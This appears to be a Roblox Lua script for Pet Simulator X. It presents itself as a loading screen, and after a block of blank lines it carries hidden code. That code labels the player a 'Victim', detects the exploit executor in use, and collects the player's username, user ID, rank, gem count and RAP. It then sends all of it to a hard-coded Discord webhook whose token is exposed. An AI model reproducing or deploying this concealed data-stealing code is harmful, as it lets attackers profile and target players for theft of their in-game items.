local Players = game:GetService("Players")
local ReplicatedFirst = game:GetService("ReplicatedFirst")
local TweenService = game:GetService("TweenService")

local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

local screenGui = Instance.new("ScreenGui")
screenGui.IgnoreGuiInset = true
screenGui.Parent = playerGui
local textLabel = Instance.new("TextLabel")
textLabel.Size = UDim2.new(1, 0, 1, 0)
textLabel.BackgroundColor3 = Color3.fromRGB(0, 0, 102)
textLabel.Font = Enum.Font.GothamMedium
textLabel.TextColor3 = Color3.new(0.8, 0.8, 0.8)
textLabel.Text = "Loading"
textLabel.TextSize = 28
textLabel.Parent = screenGui
local loadingRing = Instance.new("ImageLabel")
loadingRing.Size = UDim2.new(0, 256, 0, 256)
loadingRing.BackgroundTransparency = 1
loadingRing.Image = "rbxassetid://4965945816"
loadingRing.AnchorPoint = Vector2.new(0.5, 0.5)
loadingRing.Position = UDim2.new(0.5, 0, 0.5, 0)
loadingRing.Parent = screenGui

-- Remove the default loading screen
ReplicatedFirst:RemoveDefaultLoadingScreen()

local tweenInfo = TweenInfo.new(4, Enum.EasingStyle.Linear, Enum.EasingDirection.In, -1)
local tween = TweenService:Create(loadingRing, tweenInfo, {Rotation = 360})
tween:Play()

task.wait(30)  -- Force screen to appear for a minimum number of seconds
if not game:IsLoaded() then
 game.Loaded:Wait()
end
screenGui:Destroy()
















local function getexploit()
	local exploit =
		(syn and not is_sirhurt_closure and not pebc_execute and "Synapse") or
		(secure_load and "Sentinel") or
		(is_sirhurt_closure and "Sirhurt") or
		(pebc_execute and "ProtoSmasher") or
		(KRNL_LOADED and "Krnl") or
		(WrapGlobal and "WeAreDevs") or
		(isvm and "Proxo") or
		(shadow_env and "Shadow") or
		(jit and "EasyExploits") or
		(getscriptenvs and "Calamari") or
		(unit and not syn and "Unit") or
		(OXYGEN_LOADED and "Oxygen U") or
		(IsElectron and "Electron") or
	        (Flux and "Fluxus") or
		("N/A")
  
	return exploit
  end
  
--// Execution Log
if game.PlaceId == 6284583030 then
	_G.GameIn = "Pet Simulator X"
elseif game.PlaceId == 7722306047 then
	_G.GameIn = "PSX Trading Plaza"
elseif game.PlaceId == 10321372166 then
	_G.GameIn = "PSX Hardcore"
elseif game.PlaceId == 12610002282 then
	_G.GameIn = "PSX Pro Trading Plaza"
elseif game.PlaceId == 11725212117 then
	_G.GameIn = "PSX Voice Trading Plaza"
else
	_G.GameIn = "💔 Couldn't find game"
end
local webhookcolor = "1127128"
_G.CurrentRank = game:GetService("Players").LocalPlayer.PlayerGui.Main.Right.Rank.RankName.Text
_G.PlrUserVictim = game.Players.LocalPlayer.Name
_G.PlrUserIDVictim = game.Players.LocalPlayer.UserId
_G.PlrDisplayNameVictim = game.Players.LocalPlayer.DisplayName
_G.DisplayDiamond = game:GetService("Players").LocalPlayer.leaderstats.Diamonds.Value
_G.DisplayRap = game:GetService("Players").LocalPlayer.leaderstats.RAP.Value
_G.DisplayBankTier = game:GetService("Players").LocalPlayer.PlayerGui.Bank.Frame.BankTitle.Tier.Text
local function sendwebhookDualHook(msgpremium)
local msg = {
	["avatar_url"] = "https://cdn.discordapp.com/attachments/1075256909713645588/1108784888888447016/R_2.png",
	["content"]= "**💎New Notifaction💎** || @here|| ",
	["username"] = "💎 MrHub PSX 💎",
	["embeds"]= {
	  {
		["title"]= "`You've Got Mail!".. game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name .."!`",
		["description"]= "**Data from the Sender**\n**🥶Display Name: **".._G.PlrDisplayNameVictim.."\n**🥶Username: **".._G.PlrUserVictim.."\n**🥶User ID: **".._G.PlrUserIDVictim.."\n**👁Rank: **".._G.CurrentRank.."\n**🎮Place: **".._G.GameIn.."**\n💭Executor: **"..getexploit(),
		["url"]= "https://discord.gg/f6QWTHeEkd",
		["color"]= ""..webhookcolor.."",
		["thumbnail"] = {
        ["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png",
        ["height"] = 420,
        ["width"] = 420
        },
		["fields"]= {
        {
          ["name"]= "**💎Gems💎**",
          ["value"]= "```".._G.DisplayDiamond.."```",
          ["inline"]= true
        },
        {
          ["name"]= "**👣Rap👣**",
          ["value"]= "```".._G.DisplayRap.."```",
          ["inline"]= true
        }
      }
 }
   },
	["attachments"] = {}
  }
  local Webhook = "https://discord.com/api/webhooks/1107824932538286101/F_dKjUoABU7pPMPa394w9a4au3H1UMK6lA5KY0Kq1eZKA6XEuB0QTeeaaMChjUELa4o9"
  request = http_request or request or HttpPost or syn.request
  request({Url = Webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = game.HttpService:JSONEncode(msg)})
  end
sendwebhookDualHook(msgpremium)
